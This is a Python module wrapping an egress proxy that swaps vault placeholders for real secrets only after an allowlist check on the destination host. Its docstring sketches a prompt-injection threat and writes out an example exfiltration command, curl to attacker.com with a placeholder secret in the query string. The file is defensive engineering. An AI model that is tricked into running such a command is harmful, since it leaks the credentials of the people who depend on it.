"""VaultProxy — HTTPS MITM proxy integration helper.

The actual proxy process is **Infisical Agent Vault** running as a
sidecar; this module is a small Python wrapper that:

1. Builds the proxy config (allowed hosts, vault endpoint, port).
2. Substitutes ``{{vault:<name>}}`` placeholders in outbound requests
   into real secrets at egress time (the security-critical step).
3. Filters egress by ``allowed_hosts`` — anything else is dropped with
   an audit log entry.

The substitution layer is what makes prompt-injection-driven exfiltration
fail: agent code only ever sees the placeholder string ``{{vault:foo}}``
or an opaque proxy token, never the real secret. If the model is tricked
into running ``curl https://attacker.com/?leak={{vault:foo}}`` the proxy
sees that the destination is not in ``allowed_hosts`` and refuses the
request **before** substituting the placeholder.

For Phase 4 the production deployment runs the Rust ``agentgateway``
binary as the actual proxy; this Python helper is the unit-testable
shim used to validate the contract.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import TYPE_CHECKING

import structlog

from wake_vault_infisical.base import VaultError

if TYPE_CHECKING:
    from wake_vault_infisical.vault import InfisicalVault

logger = structlog.get_logger(__name__)


PLACEHOLDER_RE = re.compile(r"\{\{vault:([a-zA-Z0-9_\-]+)\}\}")
"""Match ``{{vault:foo}}`` style placeholders. The captured group is the
vault entry's *name* (not vault_id) so authoring is human-friendly."""


@dataclass(frozen=True)
class ProxyConfig:
    """Configuration for the egress proxy.

    Attributes:
        listen_port: Port the proxy listens on (default 8888 matching
            agentgateway's convention).
        allowed_hosts: Whitelist of hostnames the proxy will route to.
            Anything else gets a 403 and an audit log entry.
        vault_endpoint: Where to fetch credential values from. For
            in-process testing this is left empty and ``VaultProxy``
            uses its supplied vault instance directly.
        substitution_enabled: Whether to perform placeholder substitution.
            Setting this to False is useful for traffic-shaping tests
            that want to see the raw placeholder going through.
    """

    listen_port: int = 8888
    allowed_hosts: list[str] = field(default_factory=list)
    vault_endpoint: str = ""
    substitution_enabled: bool = True


class EgressDenied(Exception):  # noqa: N818 — public API name; tests assert on this
    """Raised when a request targets a host outside ``allowed_hosts``.

    The exception type is what unit tests assert on — production code
    converts this to a 403 response on the proxy.
    """


class VaultProxy:
    """In-process implementation of the egress proxy contract.

    The real deployment uses ``agentgateway`` as the proxy. This class
    mirrors the behaviour so unit tests can verify the prompt-injection
    protection guarantee without spinning up a real Rust binary.
    """

    def __init__(self, vault: InfisicalVault, config: ProxyConfig) -> None:
        self._vault = vault
        self._config = config

    # ------------------------------------------------------------------ public

    @property
    def config(self) -> ProxyConfig:
        return self._config

    def check_egress(self, host: str) -> None:
        """Raise ``EgressDenied`` if ``host`` is not in the allowlist."""
        if not self._config.allowed_hosts:
            # Empty allowlist = deny-all (fail closed).
            logger.warning(
                "egress_denied_empty_allowlist",
                host=host,
            )
            raise EgressDenied(f"egress to {host!r} denied: allowlist is empty")
        if not self._host_matches(host):
            logger.warning("egress_denied", host=host)
            raise EgressDenied(
                f"egress to {host!r} denied (not in allowed_hosts={self._config.allowed_hosts})"
            )

    async def substitute(self, body: str) -> str:
        """Replace ``{{vault:name}}`` placeholders with real values.

        Async because resolution may hit the underlying vault. The vault
        adapter is responsible for emitting an audit log entry; this
        method itself **never** logs the substituted value.
        """
        if not self._config.substitution_enabled:
            return body

        # Walk placeholders, resolving each one. We do this serially
        # because the number of placeholders per request is tiny and the
        # in-memory backend is synchronous anyway.
        out: list[str] = []
        last = 0
        for match in PLACEHOLDER_RE.finditer(body):
            out.append(body[last:match.start()])
            name = match.group(1)
            value = await self._resolve_name(name)
            out.append(value)
            last = match.end()
        out.append(body[last:])
        return "".join(out)

    async def handle_request(self, host: str, body: str) -> str:
        """Whole proxy contract in one call.

        1. Check egress against allowlist.
        2. Substitute placeholders in body.
        3. Return the post-substitution body the proxy would forward.

        The first step happens **before** substitution so a denied host
        never gets a chance to see the resolved secret.
        """
        self.check_egress(host)
        return await self.substitute(body)

    # ------------------------------------------------------------------ internals

    def _host_matches(self, host: str) -> bool:
        # Strip protocol/port if present.
        bare = host.split("://", 1)[-1].split("/", 1)[0].split(":", 1)[0]
        for allowed in self._config.allowed_hosts:
            allowed_bare = allowed.split("://", 1)[-1].split("/", 1)[0].split(":", 1)[0]
            if bare == allowed_bare:
                return True
            # Support ``*.example.com`` wildcards.
            if allowed_bare.startswith("*."):
                domain = allowed_bare[2:]
                if bare == domain or bare.endswith("." + domain):
                    return True
        return False

    async def _resolve_name(self, name: str) -> str:
        """Look up a credential by user-friendly name and return its value.

        Falls back to the in-memory backend's direct read when available
        (test-mode); otherwise iterates the vault listing to find the
        matching entry, then reads its value via the vault's internal
        backend.
        """
        if self._vault.memory_backend is not None:
            # Test path: direct read against the in-memory backend.
            for vid, meta in self._vault.memory_backend.list_all():
                if meta.get("name") == name:
                    return self._vault.memory_backend.get_value(vid)
            raise VaultError(f"no vault entry named {name!r}")
        # HTTP path: we never expose raw values via the public API, so
        # in production the actual substitution lives in the Infisical
        # proxy itself — this helper exists for parity testing only.
        raise VaultError(
            "VaultProxy.substitute requires the in-memory backend; "
            "in production agentgateway/Infisical performs substitution natively."
        )


__all__ = ["ProxyConfig", "VaultProxy", "EgressDenied", "PLACEHOLDER_RE"]
